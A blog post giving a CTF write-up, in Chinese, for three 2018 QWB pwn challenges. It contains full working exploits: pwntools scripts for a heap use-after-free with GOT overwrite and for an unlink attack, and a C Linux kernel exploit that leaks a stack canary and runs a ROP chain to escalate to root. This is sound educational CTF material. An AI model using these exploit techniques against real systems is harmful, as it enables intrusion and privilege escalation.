---
layout:     post
title:      2018强网杯pwn部分writeup
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>[索引目录]  
>0x001 silent  
>0x002 silent2  
>0x003 core  
<!-- more -->


## 0x001 silent(fastbin attack)

delete操作没有清空指针，造成uaf
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x001-001.png)

伪造chunk改got表
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x001-002.png)

exp.py
```
#!/bin/sh
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

context.terminal = ['tmux', 'splitw', '-h']

#s = remote("39.107.32.132", "10000")
s = process("./silent")
elf = ELF("./silent")

def add(l,con):
	s.sendline("1")
	sleep(0.2)
	s.sendline(str(l))
	sleep(0.2)
	s.send(con)

def delete(idx):
	s.sendline("2")
	sleep(0.2)
	s.sendline(str(idx))

def edit(idx,con1,con2):
	s.sendline("3")
	sleep(0.2)
	s.sendline(str(idx))
	sleep(0.2)
	s.send(con1)
	sleep(0.2)
	s.send(con2)

add(0x60,"AAAA".ljust(0x5F, 'A'))
sleep(0.2)
add(0x60,"AAAA".ljust(0x5F, 'A'))
sleep(0.2)
add(0x60,"AAAA".ljust(0x5F, 'A'))
sleep(0.2)
delete(0)
sleep(0.2)
delete(1)
sleep(0.2)
delete(2)
sleep(0.2)


free_got = 0x602018
fake_chunk = p64(0) + p64(0x71)
fake_chunk = fake_chunk.ljust(0x2F, 'k')

edit(2, p64(0x6020A5-8)[:3] + chr(0), fake_chunk)
sleep(0.2)
padding = "/bin/sh\x00" + "a" * 0xb
padding += p64(free_got)
add(0x60, padding)
sleep(0.2)
add(0x60, padding)
sleep(0.2)
edit(0, p64(elf.symbols["system"]), p64(elf.symbols["system"]))
sleep(0.2)
delete(4)
sleep(0.2)

s.interactive()
```


## 0x002 silent2(unlink)

跟silent一样，只是限制不能malloc fastbin，可以利用unlink
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x002-001.png)

```
#!/usr/bin/env python2
## -*- coding: utf-8 -*- #
from pwn import *
context.arch = 'amd64'
context.log_level='debug'

s = process("./silent2")
elf = ELF("./silent2")

def add(l,con):
	sleep(0.2)
	s.sendline("1")
	sleep(0.2)
	s.sendline(str(l))
	sleep(0.2)
	s.send(con)

def delete(idx):
	sleep(0.2)
	s.sendline("2")
	sleep(0.2)
	s.sendline(str(idx))

def edit(idx,con):
	sleep(0.2)
	s.sendline("3")
	sleep(0.2)
	s.sendline(str(idx))
	sleep(0.2)
	s.send(con)


add(0x80,"AAAA".ljust(0x7f,'A'))
add(0x80,"AAAA".ljust(0x7f,'A'))
add(0x80,"AAAA".ljust(0x7f,'A'))
add(0x80,"AAAA".ljust(0x7f,'A'))
add(0x80,"AAAA".ljust(0x7f,'A'))
add(0x80,"/bin/sh\x00")
delete(3)
delete(4)

free_got = elf.got["free"]
system_plt = elf.plt["system"]

fake_addr = 0x6020c0+3*8
fake_chunk = ""
fake_chunk += p64(0)
fake_chunk += p64(0x81)
fake_chunk += p64(fake_addr-3*8)
fake_chunk += p64(fake_addr-2*8)
fake_chunk += "".ljust(0x80-4*8, 'A')
fake_chunk += p64(0x80)
fake_chunk += p64(0x80+0x10)

add(0x80+0x10+0x80,fake_chunk)
delete(4)
edit(3,p64(free_got))
edit(0,p64(system_plt))
delete(5)

s.interactive()
```


## 0x003 core

安装qemu
```
$ apt install qemu qemu-system
```

也可以编译安装qemu，看这篇
[玩转qemu之环境搭建](http://www.wooy0ung.me/note/2018/02/27/qemu-environment/)

qemu启动命令
```
-m megs set virtual RAM size to megs MB [default=128]
-kernel bzImage use ‘bzImage’ as kernel image
-initrd file use ‘file’ as initial ram disk
-append cmdline use ‘cmdline’ as kernel command line
-s shorthand for -gdb tcp::1234
```

编辑start.sh
```
qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
```

这样就启动完成
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-001.png)

但隔一段时间就自动power down
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-002.png)

解包core.cpio干掉定时死机
```
$ mkdir core
$ mv core.cpio ./core/core.cpio.gz
$ cd core
$ gunzip core.cpio.gz
$ cpio -idmv < core.cpio
$ rm -rf core.cpio
$ nano init
```

删掉这句
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-003.png)

重新打包
```
$ ./gen_cpio.sh core.cpio
$ mv core.cpio ../core.cpio
$ cd ..
$ rm -rf core
```

/tmp目录下有一个符号文件kallsyms，找到commit_creds和prepare_kernel_cred的地址
```
prepare_kernel_cred		0xffffffffb8c9cce0
commit_creds			0xffffffffb8c9c8e0
```
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-004.png)

按照kernel pwn的套路，这个core.ko就是存在漏洞的模块
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-005.png)

在解包文件里找到core.ko，主要有core_ioctl、core_read、core_write、core_release、core_copy_func几个操作
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-006.png)

ioctl函数，根据传入命令a2，分别调用函数read、wirte、copy_func
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-007.png)

copy_func函数，当传入参数a1为负数会产生溢出
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-008.png)

read函数，配合print操作修改偏移off，导致内核栈上的信息泄露，leak出canary
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-009.png)

构造rop修改cred结构root提权
```
0x9090909090909090,
0x9090909090909090,
0x9090909090909090,
0x9090909090909090,
0x9090909090909090,
0x9090909090909090,
0x9090909090909090,
0x9090909090909090,
canary,
0x9090909090909090,
&set_uid,
ret_addr-0xc5,
&s-0x100,
iret_addr,
&get_shell,
user_cs,
user_rflags,
&s-0x100,
user_ss
```

write函数，将rop_chain拷贝到bss段，再调用copy_func拷贝到内核栈上
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-010.png)

exp.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

#define COMMAND_READ 0x6677889B
#define COMMAND_PRINT 0x6677889C
#define COMMAND_COPY 0x6677889A

#define u64 unsigned long long

unsigned long user_cs, user_ss, user_rflags;

u64 commit_creds_addr = 0;
u64 prepare_kernel_cred_addr = 0;

static void save_state(){
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}

void set_uid()
{
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}

void win()
{
    system("/bin/sh");
}

int main(int argc,char **argv)
{
	printf("prepare_kernel_cred: ", &prepare_kernel_cred_addr);
	scanf("%llx", &prepare_kernel_cred_addr);
	printf("commit_creds: ", &commit_creds_addr);
	scanf("%llx", &commit_creds_addr);

	char s[100];
	char* leak = (char*)malloc(1024);
	int fd = open("/proc/core",O_RDWR);

	/*----------------------info leak------------------------*/
	ioctl(fd,COMMAND_PRINT,0x40);
	ioctl(fd,COMMAND_READ,leak);
	u64 canary = ((u64*)leak)[0];
	u64 ret_addr = ((u64*)leak)[2];

	/*----------------------rop chain------------------------*/
	u64 iret_addr = prepare_kernel_cred_addr - 311838;
	save_state();
	u64 rop_chain[]={
	0x9090909090909090,
	0x9090909090909090,
	0x9090909090909090,
	0x9090909090909090,
	0x9090909090909090,
	0x9090909090909090,
	0x9090909090909090,
	0x9090909090909090,
	canary,
	0x9090909090909090,
	&set_uid,
	ret_addr-0xc5,
	&s-0x100,
	iret_addr,
	&win,
	user_cs,
	user_rflags,
	&s-0x100,
	user_ss
	};
	write(fd,rop_chain,1024);
	ioctl(fd,COMMAND_COPY,0xff00000000000100);

	return 0;
}
```

编译exp，拷贝到/tmp目录
```
$ gcc -Os -static exp.c -lutil -o exp
```

重新打包cpio
```
$ find . | cpio -o -H newc | gzip > ../core.cpio
```

启动内核，因为开了kaslr，需要重新确定prepare_kernel_cred、commit_creds地址
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-011.png)

root~
![](/assets/img/writeup/2018-04-01-qwb-2018-pwn-writeup/0x003-012.png)

参考
[强网杯2018 core环境搭建](http://eternalsakura13.com/2018/03/31/b_core/)
[一道简单内核题入门内核利用](https://www.anquanke.com/post/id/86490)